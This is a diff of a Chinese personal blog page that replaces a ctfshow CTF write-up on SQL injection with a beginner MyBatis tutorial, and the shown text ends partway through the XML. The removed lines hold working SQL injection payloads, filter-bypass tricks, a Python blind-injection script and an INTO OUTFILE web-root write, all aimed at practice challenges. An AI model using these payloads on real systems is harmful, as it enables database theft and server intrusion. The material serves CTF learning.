@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="web入门sql注入, l0odrd的博客">
+    <meta name="keywords" content="mybatis, l0odrd的博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>web入门sql注入 | l0odrd的博客</title>
+    <title>mybatis | l0odrd的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -244,12 +244,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/mybatis-logo.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">web入门sql注入</h1>
+                    <h1 class="description center-align post-title">mybatis</h1>
                 </div>
             </div>
         </div>
@@ -365,23 +365,14 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/ctf-sql/">
-                                <span class="chip bg-color">ctf-sql</span>
+                            <a href="/tags/mybatis/">
+                                <span class="chip bg-color">mybatis</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/ctf-sql/" class="post-category">
-                                ctf-sql
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -390,28 +381,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-24
+                    2021-11-23
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-14
+                    2021-11-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    5 分
                 </div>
                 
 
@@ -431,108 +422,104 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
-<p>爆出数据库版本号是<code>10.3.18-MariaDB</code>库名为<code>ctfshow_web</code>表名为<code>ctfshow_user</code>字段是<code>id,username,password</code></p>
+                <h1 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h1><p>环境</p>
+<ul>
+<li>jdk 1.8</li>
+<li>mysql 5.7</li>
+<li>maven 3.6.1</li>
+<li>idea</li>
+</ul>
+<p>回顾</p>
+<ul>
+<li>jdbc</li>
+<li>mysql</li>
+<li>java基础</li>
+<li>maven</li>
+<li>Junit</li>
+</ul>
+<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul>
+<li>持久层框架</li>
+<li>避免了几乎所有的jdbc代码和手动设置参数以及获取结果集</li>
+<li>可以使用简单的xml或注解来配置和映射原生类型、接口和java的pojo为数据库中的记录</li>
+</ul>
+<p>maven仓库</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="1-持久化"><a href="#1-持久化" class="headerlink" title="1.持久化"></a>1.持久化</h3><p>数据持久化</p>
+<ul>
+<li>将程序的数据在持久状态和瞬时状态转化的过程</li>
+<li>内存：断电即失</li>
+<li>数据库（jdbc），io文件持久化</li>
+<li>类比于生活中的冰箱的冷藏</li>
+</ul>
+<h3 id="2-持久层"><a href="#2-持久层" class="headerlink" title="2.持久层"></a>2.持久层</h3><p>dao层、service层、controller层</p>
+<ul>
+<li>完成持久化工作的代码</li>
+<li>层界限十分明显</li>
+</ul>
 <blockquote>
-<p><em>MariaDB</em>数据库管理系统是MySQL的一个分支</p>
+<p>为什么要使用？</p>
 </blockquote>
-<p><img src="https://i.loli.net/2021/06/24/kz3GvSAByuUiDY9.png" alt="image-20210624204528172"></p>
-<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与web171不同的是，可显列从三变成了二，再就是多了一个表<code>ctfshow_user2</code>，flag就在这个表里（其实题中已经提示了）</p>
-<p><img src="https://i.loli.net/2021/06/24/2cSJZl7hA4x6XqB.png" alt="image-20210624205510547"></p>
-<p><img src="https://i.loli.net/2021/06/24/KmQjsFfcXdAke2N.png" alt="image-20210624205843835"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select version(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot;--+</span><br></pre></td></tr></table></figure>
-<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>多了一个<code>ctfshow_user3</code>的表</p>
-<p>而且会进行正则匹配</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/losesea/p/3438520.html">preg_match用法</a></p>
-<h4 id="hex编码进行绕过"><a href="#hex编码进行绕过" class="headerlink" title="hex编码进行绕过"></a><code>hex编码</code>进行绕过</h4><p>可以直接构造<code>hex()</code>或是先进行十六进制转换</p>
-<p><img src="https://i.loli.net/2021/06/24/EvOMiGnU3PFaJlK.png" alt="image-20210624211902458"></p>
-<p><img src="https://i.loli.net/2021/06/24/W9kKU2fL3B5Xcv8.png" alt="image-20210624211839341"></p>
+<ul>
+<li><p>方便将数据存到数据库中</p>
+</li>
+<li><p>简化（解除sql与代码的耦合，sql与代码分离）、自动化、框架</p>
+</li>
+</ul>
+<h2 id="二、第一个mybatis程序"><a href="#二、第一个mybatis程序" class="headerlink" title="二、第一个mybatis程序"></a>二、第一个mybatis程序</h2><p><img src="https://i.loli.net/2021/11/26/1T7ZQvEaIoK3wUF.png" alt="image-20211126145702942"></p>
 <blockquote>
-<p>后面又学到了使用<code>base64</code>进行绕过</p>
+<p>搭建环境–&gt;导入mybatis–&gt;编写代码–&gt;测试</p>
 </blockquote>
-<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
-<p>对flag和数字进行了过滤，注的时候没有回显</p>
-<p>抓包找一下url</p>
-<p><img src="https://i.loli.net/2021/06/25/CSytwOcmjD3oxXg.png"></p>
-<p>师傅们直接上脚本tql</p>
-<p>fw不会，也想不到wwww</p>
-<p>假期一定学</p>
-<h4 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://ca49a442-6c6a-4266-9133-5271c3c12b5a.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#print(url+payload)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625160944515"></p>
-<h4 id="对数字进行替换base64绕过"><a href="#对数字进行替换base64绕过" class="headerlink" title="对数字进行替换base64绕过"></a>对数字进行替换base64绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;替换username</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换password</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;拿到替换后的flag</span><br><span class="line">YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;然后再将得到的flag替换回来</span><br><span class="line">import base64</span><br><span class="line">flagstr &#x3D; &#39;YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; flagstr.replace(&#39;numA&#39;,&#39;1&#39;).replace(&#39;numB&#39;,&#39;2&#39;).replace(&#39;numC&#39;,&#39;3&#39;).replace(&#39;numD&#39;,&#39;4&#39;).replace(&#39;numE&#39;,&#39;5&#39;).replace(&#39;numF&#39;,&#39;6&#39;).replace(&#39;numG&#39;,&#39;7&#39;).replace(&#39;numH&#39;,&#39;8&#39;).replace(&#39;numI&#39;,&#39;9&#39;).replace(&#39;numJ&#39;,&#39;0&#39;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625173838607"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select to_base64(username), to_base64 (password) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;,&#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br></pre></td></tr></table></figure>
-<p>借助web174的思路，既然可以通过<code>hex</code>绕过，那就去试试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">numFnumCnumGnumDnumFnumFnumGnumCnumFnumHnumFFnumGnumGnumGBnumCnumHnumFnumCnumCnumCnumCnumDnumFnumAnumCnumAnumFnumBnumFnumAnumBDnumCnumDnumFnumFnumCnumAnumCnumEnumBDnumCnumDnumFnumDnumFnumFnumFnumEnumBDnumCnumHnumFnumDnumFnumAnumCnumAnumBDnumCnumDnumCnumJnumCnumAnumFnumCnumFnumAnumFnumBnumCnumInumCnumDnumCnumHnumFnumBnumCnumFnumCnumGnumGD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">63746673686F777B38633334613162612D346631352D346466652D386461312D3430316361623934386236377D</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625180231493"></p>
-<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>\xnn    匹配ASCII代码中十六进制代码为nn的字符</p>
-<p>[\x00-\x7f]     匹配ASCII值从0-127的字符</p>
-</blockquote>
-<h4 id="利用读写文件写入网站根目录into-outfile注入"><a href="#利用读写文件写入网站根目录into-outfile注入" class="headerlink" title="利用读写文件写入网站根目录into outfile注入"></a>利用读写文件写入网站根目录into outfile注入</h4><p>字段数仍然是二（虽然不会回显，但是错误的话会报接口的错误）</p>
-<p>仿照web174构造</p>
-<p><code>1&#39; union select username,password from ctfshow_user5 where username=&quot;flag&quot; into outfile &#39;/var/www/html/ctfshow.txt&#39; --+ </code></p>
-<p>在网站根目录下写入文件<code>ctfshow.txt</code></p>
-<blockquote>
-<p>Apache默认根目录是:/var/www/html</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709100434410"></p>
-<h4 id="二分法盲注"><a href="#二分法盲注" class="headerlink" title="二分法盲注"></a>二分法盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于无过滤的sql注入，可以通过<code>十六进制</code>或<code>base64</code>编码替换进行绕过，还可以跑盲注脚本，利用二分法或sleep()函数；还可以尝试是否有权限写入网站根目录文件，然后直接访问该文件</p>
-<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
-<p><a target="_blank" rel="noopener" href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
-<h2 id="day5-web入门之sql注入-过滤注入"><a href="#day5-web入门之sql注入-过滤注入" class="headerlink" title="day5 web入门之sql注入-过滤注入"></a>day5 web入门之sql注入-过滤注入</h2><h3 id="web176-select被过滤"><a href="#web176-select被过滤" class="headerlink" title="web176-select被过滤"></a>web176-select被过滤</h3><p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709105105072"></p>
-<p><code>1&#39; Union select 1,2,3--+</code>无回显</p>
-<p><code>1&#39; union Select 1,2,3--+</code>有回显</p>
-<p>经过测试是只对<code>select</code>进行了过滤，通过大小写绕过</p>
-<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39; union Select 1,group_concat(username),group_concat(password) from ctfshow_user where username=&quot;flag&quot;--+</code></p>
-<h3 id="web177-空格和-被过滤"><a href="#web177-空格和-被过滤" class="headerlink" title="web177-空格和#被过滤"></a>web177-空格和#被过滤</h3><p><code>1&#39;--+</code>无回显，<code>1&#39;--</code>无回显，<code>--</code>被过滤</p>
-<p><code>1&#39;#</code>无回显，<code>#</code>也被过滤，使用url编码<code>%23</code>绕过，<code>1&#39;%23</code>有回显</p>
-<p>而在判断字段时又没有回显，好家伙原来吧空格也过滤了，使用<code>/**/</code>绕过，字段数还是3</p>
-<blockquote>
-<p>空格绕过的方式：</p>
+<p>工具类（utils–MybatisUtils）–&gt; 配置文件（resources–mybatis-config.xml）–&gt; 实体类（User）–&gt;接口（UserDao）–&gt;Mapper.xml –&gt;测试类</p>
+<h3 id="1-搭建环境"><a href="#1-搭建环境" class="headerlink" title="1.搭建环境"></a>1.搭建环境</h3><ul>
+<li><p>创建数据库</p>
+</li>
+<li><p>新建项目</p>
+</li>
+</ul>
 <ol>
-<li>注释符<code>/**/</code>，tab键<code>%a0</code></li>
-<li>括号绕过，常用于时间盲注</li>
+<li>创建普通maven项目</li>
+<li>删除src目录</li>
+<li>导入maven依赖</li>
 </ol>
-</blockquote>
-<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;/**/union/**/select/**/1,group_concat(username),group_concat(password)/**/from/**/ctfshow_user/**/where/**/username=&quot;flag&quot;/**/%23</code></p>
-<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p><code>/**/</code>和<code>%a0</code>被过滤，使用括号或是<code>%0a,%09,%0b,%0c,%0d</code>都行</p>
-<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union(select(1),(username),(password)from(ctfshow_user)where(username=&quot;flag&quot;))%23</code></p>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709170348722"></p>
-<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>只剩下<code>%0c</code>可以用了，其他都被过滤了</p>
-<p><img src="https://i.loli.net/2021/07/09/iQ5YydxOWqcsouf.png" alt="image-20210709172329770"></p>
-<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union%0cselect%0c1,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&quot;flag&quot;%0c%0c%23</code></p>
-<p><img src="https://i.loli.net/2021/07/09/AGwtTmJbDRxkiPN.png" alt="image-20210709173023533"></p>
-<p>晴天师傅的通杀payload</p>
-<p><code>?id=&#39;or(1)%23</code></p>
-<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>是对<code>%23</code>进行了过滤，不能注释后面的’了，只能通过构造<code>&#39;1&#39;=&#39;1</code></p>
-<p>贴上Y4tacker师傅的</p>
-<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
-<p>-1就是用来注释的，这个payload也相当于<code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
-<p>放进这个拼接的语句中就是<code>where username !=&#39;flag&#39; and id=&#39;&#39;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1;&quot;</code></p>
-<p><img src="https://i.loli.net/2021/07/09/N2JdzpWZDRIHT16.png" alt="image-20210709200537410"></p>
-<p>又因为and的优先级比or高，那就又相当于</p>
-<p><code>(username !=&#39;flag&#39; and id = &#39;&#39;)  or  (id=26 and&#39;1&#39;=&#39;1&#39;)</code></p>
-<p>or右边的值为1，可以读出id=26的数据</p>
-<p>还可以盲注</p>
-<p><img src="https://i.loli.net/2021/07/09/vQoe79qtV3Pjg2z.png" alt="image-20210709201034411"></p>
-<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>除了括号其他能代替的都被过滤了，继续使用y4师傅的payload</p>
-<p><img src="https://i.loli.net/2021/07/09/SvKtyFL3j4oGA7g.png" alt="image-20210709210302177"></p>
-<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>这次又把<code>flag</code>给过滤了，继续用师傅的payload</p>
-<p><img src="https://i.loli.net/2021/07/09/MxH1Q9EOYT7FNyG.png" alt="image-20210709212746118"></p>
-<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>我是fw</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Vinson404/p/7253255.html">sql注入绕过技巧</a></p>
-<h2 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
-<p><a target="_blank" rel="noopener" href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        mysql驱动--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.49<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        mybatis--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Junit--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-创建模块"><a href="#2-创建模块" class="headerlink" title="2.创建模块"></a>2.创建模块</h3><ul>
+<li>编写mybatis核心配置类</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--configuration核心配置文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span 